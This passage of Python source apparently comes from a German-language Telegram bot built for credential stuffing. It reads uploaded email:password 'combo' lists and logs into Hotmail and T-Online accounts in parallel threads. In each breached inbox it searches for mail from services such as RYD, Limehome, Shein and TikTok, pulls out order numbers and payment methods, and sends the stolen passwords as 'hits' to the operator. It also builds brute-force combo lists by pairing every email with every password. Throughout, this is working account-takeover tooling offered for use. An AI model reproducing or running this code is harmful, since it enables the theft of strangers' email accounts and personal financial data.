                email_addr, password = parts[0].strip(), parts[1].strip()
                if password and '@' in email_addr and '.' in email_addr.split('@')[-1]:
                    combos.append((email_addr, password))

            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ Keine gültigen Zeilen gefunden.")
                user_sessions.pop(user_id, None)
                return

            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ Du hast bereits einen aktiven Scan!", parse_mode='HTML')
                return

            progress_msg = bot.send_message(
                message.chat.id,
                f"🚗 <b>RYD Inbox Check gestartet!</b>\n\n"
                f"📬 Sender: <code>noreply@ryd.one</code>\n"
                f"📥 Accounts: <b>{total}</b>\n\n"
                f"⏳ Bitte warten...",
                parse_mode='HTML',
                reply_markup=stop_scan_keyboard(user_id)
            )

            hits = []
            bads = []
            no_inbox = []
            errors_list = []
            checked = [0]
            lock = threading.Lock()

            def ryd_check_one(combo):
                email_addr, password = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    result, provider = check_account_auto(email_addr, password)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(email_addr, password)

                    status = result.get("status", "RETRY")

                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{email_addr}:{password}")
                        return

                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{email_addr}:{password} | {status}")
                        return

                    found = False
                    orders = []
                    payments = []

                    if provider == "tonline":
                        found, fetched = TOnlineChecker.search_and_fetch(email_addr, password, "noreply@ryd.one", max_count=5)
                        if found and fetched:
                            orders, payments = extract_ryd_data(fetched)
                    else:
                        token = result.get("token", "")
                        cid = result.get("cid", "")
                        email_texts = _hotmail_search_and_fetch(token, cid, 'from:"noreply@ryd.one"', 5)
                        if email_texts:
                            found = True
                            orders, payments = extract_ryd_data(email_texts)

                    with lock:
                        checked[0] += 1
                        if found:
                            order_str = ", ".join(orders) if orders else "Keine"
                            pay_str = " | ".join(payments) if payments else "Keine"
                            hits.append(f"{email_addr}:{password} | RYD ✅ | Bestellungen: {order_str} | Zahlung: {pay_str}")
                            hit_num = len(hits)
                        else:
                            no_inbox.append(f"{email_addr}:{password}")

                    if found:
                        try:
                            hit_msg = (
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"🚗 <b>RYD HIT #{hit_num}</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"📧 Email: <code>{email_addr}</code>\n"
                                f"🔑 Password: <code>{password}</code>\n\n"
                                f"🚗 <b>App:</b> RYD\n"
                                f"📦 <b>Bestellungen:</b> {order_str}\n"
                                f"💳 <b>Zahlungsmethode:</b> {pay_str}\n\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"💎 {MY_SIGNATURE}"
                            )
                            ryd_is_group = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            send_target = user_id if ryd_is_group else message.chat.id
                            bot.send_message(send_target, hit_msg, parse_mode='HTML')
                        except Exception:
                            pass
                except Exception as e:
                    print(f"[RYD] Error checking {email_addr}: {e}")
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{email_addr}:{password} | ERROR")

            def ryd_progress_updater():
                last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != last:
                        last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🚗 <b>RYD Check läuft...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 Kein Match: <b>{len(no_inbox)}</b>",
                                message.chat.id,
                                progress_msg.message_id,
                                parse_mode='HTML',
                                reply_markup=stop_scan_keyboard(user_id)
                            )
                        except:
                            pass
                    time.sleep(3)

            _ryd_chat_id = message.chat.id
            _ryd_pm_id = progress_msg.message_id
            _ryd_username = message.from_user.username or ""

            def _ryd_scan_thread():
              try:
                threading.Thread(target=ryd_progress_updater, daemon=True).start()

                with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
                    executor.map(ryd_check_one, combos)

                end_scan(user_id)

                try:
                    bot.delete_message(_ryd_chat_id, _ryd_pm_id)
                except:
                    pass

                checked_count = checked[0]

                record_inbox(user_id, username=_ryd_username, service_name="RYD",
                            combos_count=checked_count, hits=len(hits), bads=len(bads))

                ryd_is_group = is_allowed_group(_ryd_chat_id) and _ryd_chat_id != user_id

                summary = (
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🚗 <b>RYD SCAN {'⏹ GESTOPPT' if checked_count < total else 'ABGESCHLOSSEN'}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Gecheckt:</b> {checked_count}/{total}\n"
                    f"✅ <b>Linked (Hit):</b> {len(hits)}\n"
                    f"📭 <b>Login OK, kein RYD:</b> {len(no_inbox)}\n"
                    f"❌ <b>Bad (Login fehlgeschlagen):</b> {len(bads)}\n"
                    f"🔄 <b>Errors/Retry:</b> {len(errors_list)}\n\n"
                    f"{'📩 <i>Hits wurden dir privat gesendet!</i>' + chr(10) + chr(10) if ryd_is_group and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"💎 {MY_SIGNATURE}"
                )
                bot.send_message(_ryd_chat_id, summary, parse_mode='HTML')

                all_lines = []
                if hits:
                    all_lines.append("═══ HITS (LINKED) ═══")
                    all_lines.extend(hits)
                if no_inbox:
                    all_lines.append("\n═══ LOGIN OK / KEIN RYD ═══")
                    all_lines.extend(no_inbox)
                if bads:
                    all_lines.append("\n═══ BAD (LOGIN FAILED) ═══")
                    all_lines.extend(bads)
                if errors_list:
                    all_lines.append("\n═══ ERRORS / RETRY ═══")
                    all_lines.extend(errors_list)

                if all_lines:
                    file_obj = BytesIO("\n".join(all_lines).encode('utf-8'))
                    file_obj.name = f"RYD_FULL_{len(hits)}hits_{len(bads)}bad_{total}total.txt"
                    send_target = user_id if ryd_is_group else _ryd_chat_id
                    bot.send_document(
                        send_target,
                        file_obj,
                        caption=(
                            f"🚗 <b>RYD Ergebnis</b>\n"
                            f"✅ {len(hits)} Hits | ❌ {len(bads)} Bad | 📭 {len(no_inbox)} Kein Match | 🔄 {len(errors_list)} Errors\n\n"
                            f"💎 {MY_SIGNATURE}"
                        ),
                        parse_mode='HTML'
                    )
              except Exception as e:
                try:
                    bot.send_message(_ryd_chat_id, f"❌ Fehler: {str(e)}")
                except:
                    pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_ryd_scan_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Fehler: {str(e)}")
        return

    # ── LIMEHOME INBOXEN MODE ────────────────────────────────────
    if doc_session.get("mode") == "inbox_limehome" and doc_session.get("step") == "waiting_combo":
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

            combos = []
            for line in raw_lines:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                parts = line.split(':', 1)
                email_addr, password = parts[0].strip(), parts[1].strip()
                if password and '@' in email_addr and '.' in email_addr.split('@')[-1]:
                    combos.append((email_addr, password))

            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ Keine gültigen Zeilen gefunden.")
                user_sessions.pop(user_id, None)
                return

            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ Du hast bereits einen aktiven Scan!", parse_mode='HTML')
                return

            progress_msg = bot.send_message(
                message.chat.id,
                f"🏨 <b>Limehome Inbox Check gestartet!</b>\n\n"
                f"📬 Domain: <code>limehome.com</code>\n"
                f"📥 Accounts: <b>{total}</b>\n\n"
                f"⏳ Bitte warten...",
                parse_mode='HTML',
                reply_markup=stop_scan_keyboard(user_id)
            )

            hits = []
            bads = []
            no_inbox = []
            errors_list = []
            checked = [0]
            lock = threading.Lock()

            def limehome_check_one(combo):
                email_addr, password = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    result, provider = check_account_auto(email_addr, password)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(email_addr, password)

                    status = result.get("status", "RETRY")

                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{email_addr}:{password}")
                        return

                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{email_addr}:{password} | {status}")
                        return

                    found = False
                    orders = []
                    payments = []

                    lh_senders = ["noreply@limehome.com", "hello@limehome.com", "limehome.com"]

                    if provider == "tonline":
                        for sender in lh_senders:
                            sf_found, fetched = TOnlineChecker.search_and_fetch(email_addr, password, sender, max_count=5)
                            if sf_found:
                                found = True
                                for item in fetched:
                                    combined = item.get("subject", "") + " " + item.get("body", "")
                                    order_match = re.search(r'(?:booking|buchung|reservation|order)[^\w]*([A-Z0-9\-]{4,20})', combined, re.IGNORECASE)
                                    if order_match:
                                        o = order_match.group(1)
                                        if o not in orders:
                                            orders.append(o)
                                    for p in extract_payment_from_text(combined.lower()):
                                        if p not in payments:
                                            payments.append(p)
                                break
                    else:
                        token = result.get("token", "")
                        cid = result.get("cid", "")
                        for query in ['from:"noreply@limehome.com"', 'from:"hello@limehome.com"']:
                            email_texts = _hotmail_search_and_fetch(token, cid, query, 5)
                            if email_texts:
                                found = True
                                for item in email_texts:
                                    combined = (item.get("subject", "") + " " + item.get("body", ""))
                                    order_match = re.search(r'(?:booking|buchung|reservation|order)[^\w]*([A-Z0-9\-]{4,20})', combined, re.IGNORECASE)
                                    if order_match:
                                        o = order_match.group(1)
                                        if o not in orders:
                                            orders.append(o)
                                    for p in extract_payment_from_text(combined.lower()):
                                        if p not in payments:
                                            payments.append(p)
                                break

                    with lock:
                        checked[0] += 1
                        if found:
                            order_str = ", ".join(orders) if orders else "Keine"
                            pay_str = " | ".join(payments) if payments else "Keine"
                            hits.append(f"{email_addr}:{password} | Limehome ✅ | Buchungen: {order_str} | Zahlung: {pay_str}")
                            hit_num = len(hits)
                        else:
                            no_inbox.append(f"{email_addr}:{password}")

                    if found:
                        try:
                            hit_msg = (
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"🏨 <b>LIMEHOME HIT #{hit_num}</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"📧 Email: <code>{email_addr}</code>\n"
                                f"🔑 Password: <code>{password}</code>\n\n"
                                f"🏨 <b>Service:</b> Limehome\n"
                                f"📦 <b>Buchungen:</b> {order_str}\n"
                                f"💳 <b>Zahlungsmethode:</b> {pay_str}\n\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"💎 {MY_SIGNATURE}"
                            )
                            lh_is_group = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            send_target = user_id if lh_is_group else message.chat.id
                            bot.send_message(send_target, hit_msg, parse_mode='HTML')
                        except Exception:
                            pass
                except Exception as e:
                    print(f"[Limehome] Error checking {email_addr}: {e}")
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{email_addr}:{password} | ERROR")

            def limehome_progress_updater():
                last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != last:
                        last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🏨 <b>Limehome Check läuft...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 Kein Match: <b>{len(no_inbox)}</b>",
                                message.chat.id,
                                progress_msg.message_id,
                                parse_mode='HTML',
                                reply_markup=stop_scan_keyboard(user_id)
                            )
                        except:
                            pass
                    time.sleep(3)

            _lh_chat_id = message.chat.id
            _lh_pm_id = progress_msg.message_id
            _lh_username = message.from_user.username or ""

            def _limehome_scan_thread():
              try:
                threading.Thread(target=limehome_progress_updater, daemon=True).start()

                with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
                    executor.map(limehome_check_one, combos)

                end_scan(user_id)

                try:
                    bot.delete_message(_lh_chat_id, _lh_pm_id)
                except:
                    pass

                checked_count = checked[0]

                record_inbox(user_id, username=_lh_username, service_name="Limehome",
                            combos_count=checked_count, hits=len(hits), bads=len(bads))

                lh_is_group = is_allowed_group(_lh_chat_id) and _lh_chat_id != user_id

                summary = (
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🏨 <b>LIMEHOME SCAN {'⏹ GESTOPPT' if checked_count < total else 'ABGESCHLOSSEN'}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Gecheckt:</b> {checked_count}/{total}\n"
                    f"✅ <b>Linked (Hit):</b> {len(hits)}\n"
                    f"📭 <b>Login OK, kein Limehome:</b> {len(no_inbox)}\n"
                    f"❌ <b>Bad (Login fehlgeschlagen):</b> {len(bads)}\n"
                    f"🔄 <b>Errors/Retry:</b> {len(errors_list)}\n\n"
                    f"{'📩 <i>Hits wurden dir privat gesendet!</i>' + chr(10) + chr(10) if lh_is_group and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"💎 {MY_SIGNATURE}"
                )
                bot.send_message(_lh_chat_id, summary, parse_mode='HTML')

                all_lines = []
                if hits:
                    all_lines.append("═══ HITS (LINKED) ═══")
                    all_lines.extend(hits)
                if no_inbox:
                    all_lines.append("\n═══ LOGIN OK / KEIN LIMEHOME ═══")
                    all_lines.extend(no_inbox)
                if bads:
                    all_lines.append("\n═══ BAD (LOGIN FAILED) ═══")
                    all_lines.extend(bads)
                if errors_list:
                    all_lines.append("\n═══ ERRORS / RETRY ═══")
                    all_lines.extend(errors_list)

                if all_lines:
                    file_obj = BytesIO("\n".join(all_lines).encode('utf-8'))
                    file_obj.name = f"LIMEHOME_FULL_{len(hits)}hits_{len(bads)}bad_{total}total.txt"
                    send_target = user_id if lh_is_group else _lh_chat_id
                    bot.send_document(
                        send_target,
                        file_obj,
                        caption=(
                            f"🏨 <b>Limehome Ergebnis</b>\n"
                            f"✅ {len(hits)} Hits | ❌ {len(bads)} Bad | 📭 {len(no_inbox)} Kein Match | 🔄 {len(errors_list)} Errors\n\n"
                            f"💎 {MY_SIGNATURE}"
                        ),
                        parse_mode='HTML'
                    )
              except Exception as e:
                try:
                    bot.send_message(_lh_chat_id, f"❌ Fehler: {str(e)}")
                except:
                    pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_limehome_scan_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Fehler: {str(e)}")
        return
    # ────────────────────────────────────────────────────────────

    # ── COMBO GENERATOR MODE ─────────────────────────────────────
    if doc_session.get("mode") == "combo_gen":
        step = doc_session.get("step", "")
        if step == "waiting_emails":
            try:
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

                emails = []
                for line in raw_lines:
                    line = line.strip()
                    if line and '@' in line and '.' in line.split('@')[-1]:
                        email_part = line.split(':')[0].strip() if ':' in line else line.strip()
                        if email_part and '@' in email_part:
                            emails.append(email_part)

                emails = list(dict.fromkeys(emails))

                if not emails:
                    bot.send_message(message.chat.id, "❌ Keine gültigen Emails gefunden.")
                    user_sessions.pop(user_id, None)
                    return

                user_sessions[user_id] = {"mode": "combo_gen", "step": "waiting_passwords", "emails": emails}
                bot.send_message(
                    message.chat.id,
                    f"✅ <b>{len(emails)} Emails geladen!</b>\n\n"
                    f"🔑 <b>Schritt 2:</b> Schick mir jetzt die <b>Passwort-Liste</b> (.txt)\n"
                    f"Ein Passwort pro Zeile:\n"
                    f"<code>password123\nqwerty\n12345678</code>",
                    parse_mode='HTML'
                )
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Fehler: {str(e)}")
            return

        elif step == "waiting_passwords":
            try:
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

                passwords = []
                for line in raw_lines:
                    line = line.strip()
                    if line:
                        passwords.append(line)

                passwords = list(dict.fromkeys(passwords))

                if not passwords:
                    bot.send_message(message.chat.id, "❌ Keine gültigen Passwörter gefunden.")
                    return

                emails = doc_session.get("emails", [])
                combos = []
                for email_addr in emails:
                    for pw in passwords:
                        combos.append(f"{email_addr}:{pw}")

                total = len(combos)

                file_obj = BytesIO("\n".join(combos).encode('utf-8'))
                file_obj.name = f"COMBOS_{len(emails)}mails_{len(passwords)}pw_{total}total.txt"
                bot.send_document(
                    message.chat.id,
                    file_obj,
                    caption=(
                        f"🔀 <b>Combo Generator Ergebnis</b>\n\n"
                        f"📧 Emails: <b>{len(emails)}</b>\n"
                        f"🔑 Passwörter: <b>{len(passwords)}</b>\n"
                        f"📦 Combos erstellt: <b>{total}</b>\n\n"
                        f"💎 {MY_SIGNATURE}"
                    ),
                    parse_mode='HTML'
                )
                user_sessions.pop(user_id, None)
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Fehler: {str(e)}")
            return

    # ── COMBO CLEANER MODE ──────────────────────────────────────
    if user_sessions.get(user_id, {}).get("mode") == "combo_cleaner":
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

            original_count = len(raw_lines)
            seen = set()
            cleaned = []
            removed_duplicates = 0
            removed_invalid = 0

            for line in raw_lines:
                line = line.strip()
                if not line:
                    removed_invalid += 1
                    continue
                if ':' not in line:
                    removed_invalid += 1
                    continue
                parts = line.split(':', 1)
                email = parts[0].strip()
                password = parts[1].strip()
                if not password:
                    removed_invalid += 1
                    continue
                # Basic email format check
                if '@' not in email or '.' not in email.split('@')[-1]:
                    removed_invalid += 1
                    continue
                # Duplicate check
                key = line.lower()
                if key in seen:
                    removed_duplicates += 1
                    continue
                seen.add(key)
                cleaned.append(f"{email}:{password}")

            cleaned_count = len(cleaned)
            result_text = "\n".join(cleaned)

            file_obj = BytesIO(result_text.encode('utf-8'))
            file_obj.name = f"cleaned_{cleaned_count}.txt"

            caption = (
                f"🧹 <b>COMBO CLEANER FERTIG!</b>\n\n"
                f"📥 Original: <b>{original_count}</b> Zeilen\n"
                f"✅ Sauber: <b>{cleaned_count}</b> Zeilen\n"
                f"🗑 Duplikate entfernt: <b>{removed_duplicates}</b>\n"
                f"❌ Ungültig entfernt: <b>{removed_invalid}</b>\n\n"
                f"💎 {MY_SIGNATURE}"
            )
            bot.send_document(message.chat.id, file_obj, caption=caption, parse_mode='HTML')
            user_sessions.pop(user_id, None)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Fehler beim Bereinigen: {str(e)}")
        return

    # ── MAIL EXTRACTOR (CHECKER) MODE ───────────────────────────
    if user_sessions.get(user_id, {}).get("mode") == "mail_extractor":
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

            # Parse valid-format lines only
            combos = []
            for line in raw_lines:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                parts = line.split(':', 1)
                email = parts[0].strip()
                password = parts[1].strip()
                if not password or '@' not in email or '.' not in email.split('@')[-1]:
                    continue
                combos.append((email, password))

            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ Keine gültigen Zeilen gefunden.")
                user_sessions.pop(user_id, None)
                return

            progress_msg = bot.send_message(
                message.chat.id,
                f"🔍 <b>Checking {total} Accounts...</b>\n\n"
                f"⏳ Bitte warten...",
                parse_mode='HTML'
            )

            hits = []
            checked = [0]
            lock = threading.Lock()

            def check_one(combo):
                email, password = combo
                try:
                    result, provider = check_account_auto(email, password)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(email, password)
                    with lock:
                        checked[0] += 1
                        if result.get("status") == "HIT":
                            hits.append(f"{email}:{password}")
                except Exception as e:
                    print(f"[MailExtractor] Error checking {email}: {e}")
                    with lock:
                        checked[0] += 1

            def progress_updater():
                last = -1
                while checked[0] < total:
                    if checked[0] != last:
                        last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🔍 <b>Checking Accounts...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b>",
                                message.chat.id,
                                progress_msg.message_id,
                                parse_mode='HTML'
                            )
                        except:
                            pass
                    time.sleep(3)

            threading.Thread(target=progress_updater, daemon=True).start()

            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                executor.map(check_one, combos)

            if hits:
                file_obj = BytesIO("\n".join(hits).encode('utf-8'))
                file_obj.name = f"{len(hits)}x VALID HOTMAILS BY FORGECLOUD.txt"
                bot.send_document(message.chat.id, file_obj)
            else:
                bot.send_message(message.chat.id, f"❌ <b>Keine Hits gefunden</b>\n\n📥 Gecheckt: <b>{total}</b>", parse_mode='HTML')

            try:
                bot.delete_message(message.chat.id, progress_msg.message_id)
            except:
                pass

            user_sessions.pop(user_id, None)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Fehler: {str(e)}")
        return
    # ────────────────────────────────────────────────────────────

    can, remaining = can_scan(user_id)
    if not can:
        bot.send_message(message.chat.id,
                        f"⏳ <b>Rate Limit!</b>\n\n"
                        f"Next scan in: <b>{remaining}</b>",
                        parse_mode='HTML')
        return

    # Download file
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    # Save file
    file_path = f"temp_{user_id}.txt"
    with open(file_path, 'wb') as f:
        f.write(downloaded_file)

    # Update last scan time
    update_last_scan(user_id)

    # Get scan mode
    scan_mode = user_sessions.get(user_id, {}).get("mode", "all")
    custom_domain = user_sessions.get(user_id, {}).get("custom_domain", "")

    bot.send_message(message.chat.id,
                    "🚀 <b>Scan Started!</b>\n\n"
                    "Processing your combo file...",
                    parse_mode='HTML')

    # Start scanning
    is_grp = is_group_chat(message)
    threading.Thread(target=start_real_scan, 
                    args=(user_id, file_path, message.chat.id, scan_mode, custom_domain, is_grp)).start()

def start_real_scan(user_id, file_path, chat_id, scan_mode, custom_domain="", is_group_scan=False):
    """Real scanning process with STOP button"""

    if not start_scan(user_id):
        bot.send_message(chat_id, "⚠️ Du hast bereits einen aktiven Scan!", parse_mode='HTML')
        return

    # Read combos
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if ':' in line]
    except:
        bot.send_message(chat_id, "❌ Error reading file!")
        stop_scan(user_id)
        return

    total = len(lines)
    hits = 0
    bad = 0
    retry_count = 0
    linked_total = 0
    all_hits = []

    # Determine services
    if scan_mode == "gaming":
        services_to_check = SERVICES_GAMING
    elif scan_mode == "social":
        services_to_check = SERVICES_SOCIAL
    elif scan_mode == "streaming":
        services_to_check = SERVICES_STREAMING
    elif scan_mode == "ai":
        services_to_check = SERVICES_AI
    elif scan_mode == "shopping":
        services_to_check = SERVICES_SHOPPING
    elif scan_mode == "tiktok":
        services_to_check = None  # Special handling for TikTok
    elif scan_mode == "single":
        # Single platform mode - get platform from session
        platform_name = user_sessions.get(user_id, {}).get("platform", "")
        if platform_name:
            # Find the platform's email in all services
            platform_email = None
            for service_name, email in SERVICES_ALL.items():
                if service_name == platform_name:
                    platform_email = email
                    break

            if platform_email:
                services_to_check = {platform_name: platform_email}
            else:
                services_to_check = SERVICES_ALL
        else:
            services_to_check = SERVICES_ALL
    else:
        services_to_check = SERVICES_ALL

    # Send progress with STOP button
    progress_msg = bot.send_message(chat_id,
                                   "⚡ <b>CHECKING IN PROGRESS</b>\n\n"
                                   "✅ Hits: 0\n"
                                   "❌ Bad: 0\n"
                                   "🔄 Retry: 0\n"
                                   "🔗 Linked: 0\n\n"
                                   "━━━━━━━━━━━━━━━━━━━━\n"
                                   f"📊 Progress: 0/{total} (0%)\n\n"
                                   "🔍 Current: Starting...",
                                   parse_mode='HTML',
                                   reply_markup=stop_scan_keyboard(user_id))

    # PIN the message
    try:
        bot.pin_chat_message(chat_id, progress_msg.message_id, disable_notification=True)
    except:
        pass

    start_time = time.time()

    # Shared state for parallel processing
    state = {
        'hits': 0, 'bad': 0, 'retry': 0, 'linked': 0,
        'processed': 0, 'all_hits': [], 'last_email': ''
    }
    state_lock = threading.Lock()
    stopped = [False]

    def process_account(args):
        idx, line = args

        if not active_scans.get(user_id, False):
            with state_lock:
                state['processed'] += 1
                state['bad'] += 1
            return

        if ':' not in line:
            with state_lock:
                state['processed'] += 1
                state['bad'] += 1
            return

        try:
            parts = line.split(':', 1)
            email = parts[0].strip()
            password = parts[1].strip()

            with state_lock:
                state['last_email'] = email

            result, provider = check_account_auto(email, password)

            if result["status"] == "HIT":
                if scan_mode == "tiktok" and provider == "hotmail":
                    tiktok_data = HotmailChecker.check_tiktok_full(
                        email, password, result["token"], result["cid"]
                    )
                    with state_lock:
                        state['hits'] += 1
                        state['processed'] += 1
                        hit_num = state['hits']
                        if tiktok_data:
                            state['all_hits'].append({
                                "email": email, "password": password,
                                "services": [f"TikTok (@{tiktok_data['username']})"]
                            })
                        else:
                            state['all_hits'].append({
                                "email": email, "password": password, "services": []
                            })

                    if tiktok_data:
                        verified_emoji = "✅" if tiktok_data.get('verified', False) else "❌"
                        hit_msg = f"""━━━━━━━━━━━━━━━━━━━━
⚡ TIKTOK HIT #{hit_num}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Password: {password}

🎵 <b>TikTok Full Data:</b>
👤 Username: @{tiktok_data['username']}
👥 Followers: {format_number(tiktok_data.get('followers', 0))}
➕ Following: {format_number(tiktok_data.get('following', 0))}
📹 Videos: {tiktok_data.get('videos', 0)}
❤️ Likes: {format_number(tiktok_data.get('likes', 0))}
{verified_emoji} Verified: {tiktok_data.get('verified', False)}

━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE}"""
                    else:
                        hit_msg = f"""━━━━━━━━━━━━━━━━━━━━
⚡ HIT #{hit_num}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Password: {password}

━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE}"""
                    try:
                        if is_group_scan:
                            bot.send_message(user_id, hit_msg, parse_mode='HTML')
                        else:
                            bot.send_message(chat_id, hit_msg, parse_mode='HTML')
                    except:
                        pass

                else:
                    found_services = []
                    shein_payment_text = ""

                    if provider == "tonline":
                        for svc_name, svc_email in services_to_check.items():
                            try:
                                msg_ids = TOnlineChecker.search_inbox(email, password, svc_email)
                                if msg_ids:
                                    found_services.append(svc_name)
                            except Exception:
                                pass
                    else:
                        found_services = HotmailChecker.check_services(
                            email, password, result["token"], result["cid"], services_to_check
                        )

                    if "Shein" in found_services:
                        try:
                            if provider == "hotmail":
                                shein_pay = HotmailChecker.check_shein_payment(
                                    email, password, result["token"], result["cid"]
                                )
                                shein_payment_text = f"\n\n🛍️ <b>Shein Payment:</b> {shein_pay['raw']}"
                            else:
                                fetched = TOnlineChecker.fetch_emails_from(email, password, "noreply@sheinnotice.com", max_count=5)
                                pay_methods = []
                                for item in fetched:
                                    combined = item.get("subject", "") + " " + item.get("body", "")
                                    pay_methods.extend(extract_payment_from_text(combined))
                                pay_methods = list(dict.fromkeys(pay_methods))
                                if pay_methods:
                                    shein_payment_text = f"\n\n🛍️ <b>Shein Payment:</b> {' | '.join(pay_methods)}"
                                else:
                                    shein_payment_text = "\n\n🛍️ <b>Shein Payment:</b> No Payment Method"
                        except:
                            shein_payment_text = "\n\n🛍️ <b>Shein Payment:</b> N/A"

                    with state_lock:
                        state['hits'] += 1
                        state['processed'] += 1
                        state['linked'] += len(found_services)
                        hit_entry = {
                            "email": email, "password": password, "services": found_services
                        }
                        if shein_payment_text:
                            hit_entry["shein_payment"] = shein_payment_text
                        state['all_hits'].append(hit_entry)
                        hit_num = state['hits']

                    if found_services:
                        services_text = "\n".join([f"✅ {s}" for s in found_services])
                        hit_msg = f"""━━━━━━━━━━━━━━━━━━━━
⚡ HIT #{hit_num}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Password: {password}

🔗 Linked Services:
{services_text}{shein_payment_text}

━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE}"""
                    else:
                        hit_msg = f"""━━━━━━━━━━━━━━━━━━━━
⚡ HIT #{hit_num}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Password: {password}

⚠️ No linked services

━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE}"""
                    try:
                        if is_group_scan:
                            bot.send_message(user_id, hit_msg, parse_mode='HTML')
                        else:
                            bot.send_message(chat_id, hit_msg, parse_mode='HTML')
                    except:
                        pass

            elif result["status"] == "RETRY":
                with state_lock:
                    state['retry'] += 1
                    state['processed'] += 1
            else:
                with state_lock:
                    state['bad'] += 1
                    state['processed'] += 1

        except Exception as e:
            print(f"[ScanWorker] Error processing {line.split(':')[0] if ':' in line else line}: {e}")
            with state_lock:
                state['bad'] += 1
                state['processed'] += 1

    # Progress updater thread
    def progress_updater():
        while active_scans.get(user_id, False) and not stopped[0]:
            with state_lock:
                p = state['processed']
                h = state['hits']
                b = state['bad']
                r = state['retry']
                lnk = state['linked']
                last_em = state['last_email']

            if p >= total:
                break

            elapsed = time.time() - start_time
            cpm = int((p / elapsed * 60)) if elapsed > 0 else 0
            progress = (p / total * 100)

            try:
                bot.edit_message_text(
                    f"⚡ <b>CHECKING IN PROGRESS</b>\n\n"
                    f"✅ Hits: {h}\n"
                    f"❌ Bad: {b}\n"
                    f"🔄 Retry: {r}\n"
                    f"🔗 Linked: {lnk}\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Progress: {p}/{total} ({progress:.1f}%)\n"
